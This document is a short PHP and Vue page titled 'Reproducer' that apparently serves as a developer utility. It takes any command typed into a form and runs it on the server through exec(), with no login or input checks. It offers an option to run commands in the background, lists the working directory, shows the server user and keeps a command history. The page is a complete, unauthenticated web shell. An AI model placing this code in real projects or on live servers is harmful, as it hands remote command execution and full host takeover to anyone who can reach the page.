<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Reproducer</title>
    <script rel="prefetch" src="/assets/js/vue.min.js"></script>
</head>
<body>
<?php

session_start();

if (!isset($_SESSION['last_cmds'])) {
    $_SESSION['last_cmds'] = [];
}

echo 'Hello Reproducer!!';

if (isset($_POST['cmd'])) {
    $output = [];
    $trim = trim($_POST['cmd']);

    if ($trim !== $_SESSION['last_cmds'][0] ?? null) {
        array_unshift($_SESSION['last_cmds'], $trim);
    }

    if (isset($_POST['background'])) {
        $trim = 'nohup '.$trim.' > /dev/null 2>&1 & echo $!';
    }

    exec($trim, $output);
    echo '<pre>';
    foreach ($output as $line) {
        echo $line.PHP_EOL;
    }
    echo '</pre>';
}

echo '<hr>';
unset($output);
exec('ls -la', $output);
echo '<pre>';
foreach ($output as $line) {
    echo $line.PHP_EOL;
}
echo '</pre>';

?>
<hr>
<strong><?= exec('whoami') ?></strong>
<div id="app">
    <form action="/" method="post">
        <div>
            <input id="cmd" name="cmd" autocomplete="off" autofocus="autofocus" width="200px" size="100" v-model="cmd"/>
            <button type="submit">exec</button>
        </div>
        <div>
            <label><input type="checkbox" name="background"> Run in background</label>
        </div>
    </form>
    <br>
    <strong>Last commands:</strong>
    <ul id="last-cmds" data-value="<?= htmlentities(json_encode($_SESSION['last_cmds'])) ?>">
        <li v-for="cmd in lastCmds">
            <a href="javascript:" v-on:click="setCmd(cmd)">{{ cmd.value }}</a>
        </li>
    </ul>
    <strong>Utils:</strong>
    <ul>
        <li v-for="shortcut in shortcuts">
            <a href="javascript:" v-on:click="setCmd(shortcut)">{{ shortcut.value }}</a>
        </li>
    </ul>
</div>

<script>
    let app = new Vue({
        el: '#app',
        data: {
            cmd: '',
            lastCmds: [],
            shortcuts: [
                {'value': 'composer create-project symfony/skeleton '},
                {'value': '.apt/usr/lib/p7zip/7z '},
                {'value': 'ps -p '},
            ],
        },
        methods: {
            setCmd: function (shortcut) {
                this.cmd = shortcut.value;
                document.getElementById('cmd').focus();
            }
        },
        created() {
            const cmds = JSON.parse(document.getElementById('last-cmds').dataset.value);
            this.lastCmds = cmds.map(c => ({value: c}));
        }
    })
</script>

</body>
</html>
